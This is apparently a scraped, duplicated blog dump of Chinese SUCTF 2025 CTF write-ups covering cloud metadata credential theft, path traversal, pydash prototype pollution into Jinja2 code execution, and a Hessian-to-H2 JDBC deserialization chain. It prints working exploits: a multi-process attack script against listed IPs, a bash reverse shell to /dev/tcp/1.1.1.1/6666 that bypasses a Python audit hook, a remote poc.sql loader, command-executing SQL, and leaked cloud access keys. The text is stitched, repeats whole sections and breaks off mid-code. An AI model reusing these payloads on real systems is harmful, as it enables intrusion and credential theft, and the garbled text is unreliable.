直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = 